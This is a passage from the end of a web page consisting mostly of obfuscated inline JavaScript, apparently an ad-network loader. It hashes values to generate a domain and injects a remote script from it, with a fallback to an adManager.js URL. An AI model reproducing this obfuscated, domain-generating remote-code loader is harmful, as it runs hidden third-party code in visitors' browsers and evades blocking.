],0x4,-0x5c6be),X7=H(X7,X4,X5,X6,X3[X2+0x8],0xb,-0x788e097f),X6=H(X6,X7,X4,X5,X3[X2+0xb],0x10,0x6d9d6122),X5=H(X5,X6,X7,X4,X3[X2+0xe],0x17,-0x21ac7f4),X4=H(X4,X5,X6,X7,X3[X2+0x1],0x4,-0x5b4115bc),X7=H(X7,X4,X5,X6,X3[X2+0x4],0xb,0x4bdecfa9),X6=H(X6,X7,X4,X5,X3[X2+0x7],0x10,-0x944b4a0),X5=H(X5,X6,X7,X4,X3[X2+0xa],0x17,-0x41404390),X4=H(X4,X5,X6,X7,X3[X2+0xd],0x4,0x289b7ec6),X7=H(X7,X4,X5,X6,X3[X2+0x0],0xb,-0x155ed806),X6=H(X6,X7,X4,X5,X3[X2+0x3],0x10,-0x2b10cf7b),X5=H(X5,X6,X7,X4,X3[X2+0x6],0x17,0x4881d05),X4=H(X4,X5,X6,X7,X3[X2+0x9],0x4,-0x262b2fc7),X7=H(X7,X4,X5,X6,X3[X2+0xc],0xb,-0x1924661b),X6=H(X6,X7,X4,X5,X3[X2+0xf],0x10,0x1fa27cf8),X5=H(X5,X6,X7,X4,X3[X2+0x2],0x17,-0x3b53a99b),X4=X0(X4,X5,X6,X7,X3[X2+0x0],0x6,-0xbd6ddbc),X7=X0(X7,X4,X5,X6,X3[X2+0x7],0xa,0x432aff97),X6=X0(X6,X7,X4,X5,X3[X2+0xe],0xf,-0x546bdc59),X5=X0(X5,X6,X7,X4,X3[X2+0x5],0x15,-0x36c5fc7),X4=X0(X4,X5,X6,X7,X3[X2+0xc],0x6,0x655b59c3),X7=X0(X7,X4,X5,X6,X3[X2+0x3],0xa,-0x70f3336e),X6=X0(X6,X7,X4,X5,X3[X2+0xa],0xf,-0x100b83),X5=X0(X5,X6,X7,X4,X3[X2+0x1],0x15,-0x7a7ba22f),X4=X0(X4,X5,X6,X7,X3[X2+0x8],0x6,0x6fa87e4f),X7=X0(X7,X4,X5,X6,X3[X2+0xf],0xa,-0x1d31920),X6=X0(X6,X7,X4,X5,X3[X2+0x6],0xf,-0x5cfebcec),X5=X0(X5,X6,X7,X4,X3[X2+0xd],0x15,0x4e0811a1),X4=X0(X4,X5,X6,X7,X3[X2+0x4],0x6,-0x8ac817e),X7=X0(X7,X4,X5,X6,X3[X2+0xb],0xa,-0x42c50dcb),X6=X0(X6,X7,X4,X5,X3[X2+0x2],0xf,0x2ad7d2bb),X5=X0(X5,X6,X7,X4,X3[X2+0x9],0x15,-0x14792c6f),X4=U(X4,X8),X5=U(X5,X9),X6=U(X6,XX),X7=U(X7,XR);}return v(X4)+v(X5)+v(X6)+v(X7);},M=function(F){return r+'/'+q(n+':'+T+':'+F);},P=function(){var Xu=Xe;return r+'/'+q(n+':'+t+Xu(0xae));},J=document[Xe(0xa6)](Xe(0xaf));Xe(0xa8)in J?(L=L[Xe(0xa3)]('.js',Xe(0x9d)),J[Xe(0x91)]='module'):(L=L[Xe(0xa3)](Xe(0x9c),Xe(0xb4)),J[Xe(0xb3)]=!![]),N=q(n+':'+I+':domain')[Xe(0xa9)](0x0,0xa)+Xe(0x8a),r=Xe(0x92)+q(N+':'+I)[Xe(0xa9)](0x0,0xa)+'.'+N,J[Xe(0x96)]=M(L)+Xe(0x9c),J[Xe(0x87)]=function(){window[O]['ph'](M,P,N,n,q),window[O]['init'](h);},J[Xe(0xa2)]=function(){var XQ=Xe,F=document[XQ(0xa6)](XQ(0xaf));F['src']=XQ(0x98),F[XQ(0x99)](XQ(0xa0),h),F[XQ(0xb1)]='async',document[XQ(0x97)][XQ(0xab)](F);},document[Xe(0x97)][Xe(0xab)](J);}document['readyState']===XG(0xaa)||document[XG(0x9e)]===XG(0x8f)||document[XG(0x9e)]==='interactive'?K():window[XG(0xb7)](XG(0x8e),K);}()));function X(){var Xj=['addEventListener','onload','charAt','509117wxBMdt','.com','charCodeAt','split','988kZiivS','DOMContentLoaded','loaded','533092QTEErr','type','https://','6ebXQfY','toISOString','22mCPLjO','src','head','https://js.wpadmngr.com/static/adManager.js','setAttribute','per','length','.js','.m.js','readyState','2551668jffYEE','data-admpid','827096TNEEsf','onerror','replace','0123456789abcdef','909NkPXPt','createElement','2259297cinAzF','noModule','substring','complete','appendChild','1VjIbCB','loc',':tags','script','cks','async','10xNKiRu','defer','.l.js','469955xpTljk','ksu'];X=function(){return Xj;};return X();}</script>


	</div>
<script async defer src="/js/menu.js"></script>
</body>
</html>